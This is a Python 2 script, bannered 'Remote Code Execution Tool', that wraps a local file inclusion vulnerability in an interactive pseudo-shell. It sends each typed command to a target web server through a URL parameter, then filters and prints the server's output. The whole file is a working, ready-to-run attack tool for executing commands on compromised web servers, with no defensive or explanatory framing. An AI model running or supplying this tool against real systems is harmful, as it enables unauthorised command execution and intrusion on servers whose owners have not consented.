#!/usr/bin/python

import argparse
import sys, os
from subprocess import call
import pycurl
import re
from StringIO import StringIO


parser = argparse.ArgumentParser(description='Create an interactive shell with a local file inclusion vulnerability')
parser.add_argument('-u','--url', help='LFI url',required=True)
parser.add_argument('-v','--variable', help='Command variable',required=True)
args = parser.parse_args()


command=""
newDir=""
oldDir=""
parsedString=""
history=['']
def printHeader():
    print ("""                                            
                                                           /\ 
                                                          /==\ 
                                                          |  |
                                                          |  |
                                                         /____\ 
                                                         | |R |
                                                         | |O |
                                                         | |C |
                                                         | |E |
                                                        /| |T |\ 
$$$$$$$\             $$$$$$\  $$$$$$$$\ $$$$$$$$\      / | |  | \ 
$$  __$$\           $$  __$$\ $$  _____|\__$$  __|    /__|_|__|__\ 
$$ |  $$ | $$$$$$\  $$ /  \__|$$ |         $$ |          /_\/_\/
$$$$$$$  |$$  __$$\ $$ |      $$$$$\       $$ |          ######
$$  __$$< $$ /  $$ |$$ |      $$  __|      $$ |         ########
$$ |  $$ |$$ |  $$ |$$ |  $$\ $$ |         $$ |          ######
$$ |  $$ |\$$$$$$  |\$$$$$$  |$$$$$$$$\    $$ |           ####
\__|  \__| \______/  \______/ \________|   \__|            ##
                                                           ##
Remote		      Code     Execution   Tool            ##
    """)



def parse(temp, command):   
    parsedString=""
    repeatString="" 
    seperate = '<'
    splitString = temp.split(seperate, 1) [0]
    lineList = splitString.split("\n")
    lineSeen = set()
    bad_words = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
    for line in lineList:
	if not any(line.startswith(bad_word) for bad_word in bad_words):
	    parsedString = parsedString + line + "\n"
    splitLine = parsedString.split("\n")
    for line in splitLine:
	if line not in lineSeen:
	    repeatString = repeatString + line + "\n"
	    lineSeen.add(line)
    return repeatString


def curl(url):
    buffer = StringIO()
    c = pycurl.Curl()
    c.setopt(c.URL, url)
    c.setopt(c.WRITEDATA, buffer)
    c.perform()
    c.close()
    body = buffer.getvalue()
    return body

def pwd():
    command = "pwd"
    url = args.url + args.variable+"="+command
    temp = curl(url)
    parsedString = parse(temp, command)
    parsedString = parsedString.splitlines()
    parsedString = parsedString[0].split(" ")
    return parsedString[0]

def run_cmd(command):
    command = command.replace(" ", "%20")
    url = args.url + args.variable+"="+command
    temp = curl(url)
    parsedString = parse(temp, command)
    print parsedString

printHeader()


#####  MAIN METHOD #####
dir = pwd()
while(command != "exit"):
    command = raw_input("%s$ " % dir)

    if "cd" in command:
        command = command.replace("cd ", "")
 	if(dir):
 	    oldDir = dir
 	    dir = oldDir+dir
	dir = command
    if "ls" in command:
	command = command +" "+dir

    run_cmd(command)
